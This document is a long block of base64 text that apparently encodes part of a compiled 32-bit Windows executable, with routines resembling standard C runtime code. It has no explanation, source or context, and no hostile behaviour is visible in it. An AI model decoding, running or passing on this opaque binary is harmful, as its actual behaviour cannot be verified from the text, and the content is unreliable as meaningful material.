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CLxushi30Ii3XkV+hlNwAAWcPoCYf//8cACQAAAOjbdv//g8j/6JaH///DahBowINBAOhEh///M9uJXeSLdQiD/v51F+ijhv//iRjo0Ib//8cACQAAAOm2AAAAhfYPiJcAAAA7NWyyQQAPg4sAAACL3sH7BYv+g+cfwecGiwSd2K5BAA++RDgEg+ABdQroWob//4MgAOtqVuhdNQAAWYNl/ACLBJ3YrkEA9kQ4BAF0E/91EP91DFboXgAAAIPEDIv46xboWIb//8cACQAAAOgZhv//gyAAg8//iX3kx0X8/v///+gKAAAAi8frKIt1CIt95FbofTYAAFnD6O2F//+JGOgahv//xwAJAAAA6Ox1//+DyP/op4b//8NVi+y48BoAAOjENgAAoQiQQQAzxYlF/IOlROX//wCLRQiLTQxWM/aJhTjl//9XM/+JjTDl//+JtUDl//85dRB1BzPA6Q0IAACFyXUf6IGF//8hMOiuhf//xwAWAAAA6IB1//+DyP/p6gcAAIvQi8jB+gWD4R/B4QaJlSjl//9TixSV2K5BAImNJOX//4pcESQC29D7gPsCdAWA+wF1K4tFEPfQqAF1HOgmhf//ITDoU4X//8cAFgAAAOgldf//6YgHAACLhTjl///2RBEEIHQPagJqAGoAUOjKDgAAg8QQ/7U45f//6P/Z//9ZhcAPhFADAACLhSjl//+LjSTl//+LBIXYrkEA9kQBBIAPhDIDAADoqrT//zPJi0BsOYioAAAAjYUY5f//UIuFKOX//w+UwYmNPOX//4uNJOX//4sEhdiuQQD/NAH/FRAhQQCFwA+E7gIAADm1POX//3QIhNsPhN4CAAD/FQwhQQCLlTDl//8zySGNOOX//4mFEOX//4mNNOX//4mVLOX//zlNEA+GgQYAAIuFLOX//zPSiZVA5f//x4UU5f//CgAAACG9POX//4TbD4WuAQAAihAzwIuNJOX//4D6Cg+UwImFGOX//4uFKOX//4sEhdiuQQCJhTzl//85fAE4dByKRAE0iEX0i4U85f//iFX1agIhfAE4jUX0UOtaD77CUOjD3P//WYXAdESLhTDl//+LlSzl//8rwgNFEIP4AQ+G2wEAAGoCUo2FNOX//1DoId///4PEDIP4/w+EBQMAAIuFLOX//0D/hUDl///rJmoB/7Us5f//jYU05f//UOjy3v//g8QMg/j/D4TWAgAAi4Us5f//M8lA/4VA5f//UVFqBYmFLOX//41F9FBqAY2FNOX//1BR/7UQ5f///xVgIEEAiYU85f//hcAPhJUCAABqAI2NOOX//1GLjSTl//9QjUX0UIuFKOX//4sEhdiuQQD/NAH/FbggQQCFwA+ETAEAAIu1QOX//4uNROX//wPxi4U85f//OYU45f//D4xJAgAAOb0Y5f//dEuLjSTl//+NhTjl//9qAFBqAY1F9MZF9A1Qi4Uo5f//iwSF2K5BAP80Af8VuCBBAIXAD4TtAAAAg7045f//AQ+M9wEAAP+FROX//0aLjTTl///phgAAAID7AXQFgPsCdTMPtwgz0mY7jRTl//+JjTTl//8PlMKDwAKJlTzl//+LlUDl//+DwgKJhSzl//+JlUDl//+A+wF0BYD7AnVLUejMMgAAWYuNNOX//2Y7wXV1g8YCOb085f//dCJqDVhQiYU05f//6KYyAABZi4005f//ZjvBdU9G/4VE5f//i5VA5f//i4Us5f//O1UQD4Kp/f//6UUBAACLnSjl//9GigKLlSTl//+LDJ3YrkEAiEQKNIsEndiuQQDHRAI4AQAAAOkXAQAA/xU0IEEAi/jpCgEAAIuFKOX//4sMhdiuQQCLhSTl///2RAgEgA+EdQMAAIuVMOX//zP/ib005f//hNsPhQ4BAACLXRCJlTjl//+F2w+EjQMAADPJjb306///i8KJjTzl//8rhTDl//87w3NEigpCQIiNH+X//4D5ComVOOX//4uNPOX//3UL/4VE5f//xgcNR0GKlR/l//+IF0eLlTjl//9BiY085f//gfn/EwAAcriLjSTl//+NhfTr//8r+I2FIOX//2oAUFeNhfTr//9Qi4Uo5f//iwSF2K5BAP80Af8VuCBBAIXAD4QT////A7Ug5f//Ob0g5f//fBaLlTjl//+LwiuFMOX//zvDD4JB////i7005f//i41E5f//hfYPhfUCAACF/w+ErAIAAGoFWzv7D4WYAgAA6JOA///HAAkAAADoVID//4kY6cYCAACLyoD7Ag+F6gAAADl1EA+GfAIAAMeFFOX//woAAACDpRjl//8AjZ306///i8FqDSvCi5UY5f//XjtFEHMzD7c5g8ACg8ECZju9FOX//3UQg4VE5f//AmaJM4PDAoPCAmaJO4PCAoPDAoH6/hMAAHLIjYX06///iY085f//i40k5f//K9hqAI2FIOX//1BTjYX06///UIuFKOX//4sEhdiuQQD/NAH/FbggQQCLtUDl//+LvTTl//+FwA+E8v3//wO1IOX//4m1QOX//zmdIOX//w+M8f7//4uNPOX//4vBi5Uw5f//K8I7RRAPgi7////p0/7//4tdEImNOOX//4XbD4SKAQAAx4UU5f//CgAAAIOlGOX//wCNhUjl//+LvTjl//8ryouVGOX//zvLczsPtzeDwQKDxwKJvTjl//9mO7UU5f//dRJqDV9miTiDwAKLvTjl//+DwgJmiTCDwgKDwAKB+qgGAABywTP2jY2c8v//VlZoVQ0AAFGNjUjl//8rwZkrwtH4UIvBUFZo6f0AAP8VYCBBAIu1QOX//4u9NOX//4mFPOX//4XAD4QA/f//M8mJjUDl//9qACvBjZUg5f//UlCNhZzy//8DwYuNJOX//1CLhSjl//+LBIXYrkEA/zQB/xW4IEEAhcB0HouNQOX//wONIOX//4uFPOX//4mNQOX//zvBf6/rGv8VNCBBAIuNQOX//4v4i4U85f//ib005f//O8EPj5r9//+LjTjl//+L8YuVMOX//yvyibVA5f//O/MPgsT+///pd/3//2oAjZUg5f//Uv91EP+1MOX///80CP8VuCBBAIXAD4Q9/P//i7Ug5f//M//pR/3//1fo2X3//1nrPIuVMOX//4uFKOX//4uNJOX//4sEhdiuQQD2RAEEQHQJgDoadQQzwOsc6Ml9///HABwAAADoin3//4MgAIPI/+sEK/GLxluLTfxfM81e6BdO//+L5V3DVYvsVot1CIX2D4TqAAAAi0YMOwWEnkEAdAdQ6LWN//9Zi0YQOwWInkEAdAdQ6KON//9Zi0YUOwWMnkEAdAdQ6JGN//9Zi0YYOwWQnkEAdAdQ6H+N//9Zi0YcOwWUnkEAdAdQ6G2N//9Zi0YgOwWYnkEAdAdQ6FuN//9Zi0YkOwWcnkEAdAdQ6EmN//9Zi0Y4OwWwnkEAdAdQ6DeN//9Zi0Y8OwW0nkEAdAdQ6CWN//9Zi0ZAOwW4nkEAdAdQ6BON//9Zi0ZEOwW8nkEAdAdQ6AGN//9Zi0ZIOwXAnkEAdAdQ6O+M//9Zi0ZMOwXEnkEAdAdQ6N2M//9ZXl3DVYvsVot1CIX2dFmLBjsFeJ5BAHQHUOi+jP//WYtGBDsFfJ5BAHQHUOisjP//WYtGCDsFgJ5BAHQHUOiajP//WYtGMDsFqJ5BAHQHUOiIjP//WYtGNDsFrJ5BAHQHUOh2jP//WV5dw1WL7FaLdQiF9g+EbgMAAP92BOhbjP///3YI6FOM////dgzoS4z///92EOhDjP///3YU6DuM////dhjoM4z///826CyM////diDoJIz///92JOgcjP///3Yo6BSM////dizoDIz///92MOgEjP///3Y06PyL////dhzo9Iv///92OOjsi////3Y86OSL//+DxED/dkDo2Yv///92ROjRi////3ZI6MmL////dkzowYv///92UOi5i////3ZU6LGL////dljoqYv///92XOihi////3Zg6JmL////dmTokYv///92aOiJi////3Zs6IGL////dnDoeYv///92dOhxi////3Z46GmL////dnzoYYv//4PEQP+2gAAAAOhTi////7aEAAAA6EiL////togAAADoPYv///+2jAAAAOgyi////7aQAAAA6CeL////tpQAAADoHIv///+2mAAAAOgRi////7acAAAA6AaL////tqAAAADo+4r///+2pAAAAOjwiv///7aoAAAA6OWK////trgAAADo2or///+2vAAAAOjPiv///7bAAAAA6MSK////tsQAAADouYr///+2yAAAAOiuiv//g8RA/7bMAAAA6KCK////trQAAADolYr///+21AAAAOiKiv///7bYAAAA6H+K////ttwAAADodIr///+24AAAAOhpiv///7bkAAAA6F6K////tugAAADoU4r///+20AAAAOhIiv///7bsAAAA6D2K////tvAAAADoMor///+29AAAAOgniv///7b4AAAA6ByK////tvwAAADoEYr///+2AAEAAOgGiv///7YEAQAA6PuJ//+DxED/tggBAADo7Yn///+2DAEAAOjiif///7YQAQAA6NeJ////thQBAADozIn///+2GAEAAOjBif///7YcAQAA6LaJ////tiABAADoq4n///+2JAEAAOigif///7YoAQAA6JWJ////tiwBAADoion///+2MAEAAOh/if///7Y0AQAA6HSJ////tjgBAADoaYn///+2PAEAAOheif///7ZAAQAA6FOJ////tkQBAADoSIn//4PEQP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